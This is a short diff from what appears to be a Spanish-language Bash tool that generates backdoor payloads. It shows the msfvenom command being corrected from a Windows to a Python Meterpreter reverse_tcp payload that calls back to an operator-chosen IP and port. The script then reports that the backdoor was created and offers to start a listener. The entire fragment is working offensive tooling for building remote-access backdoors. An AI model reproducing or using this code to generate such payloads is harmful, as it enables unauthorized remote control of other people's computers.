@@ -549,7 +549,7 @@ read -p "EScriba el puerto (Default 4444): " port
 read -p "EScriba el nombre de su payload(sin extensiones) " name
 sleep 2
 echo -e "$purple(*)$blue El payload sera creado a la IP:$red $ip$blue En el puerto:$red $port"
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $directory/payloads/python/$name.py
+msfvenom -p python/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $directory/payloads/python/$name.py
 echo -e "$purple(*)$blue Backdoor creado correctamente$red PATH:$blue $directory/payloads/python/$name.py"
 sleep 2
 echo -e "$purple(*)$blue Desea crear el listener?"
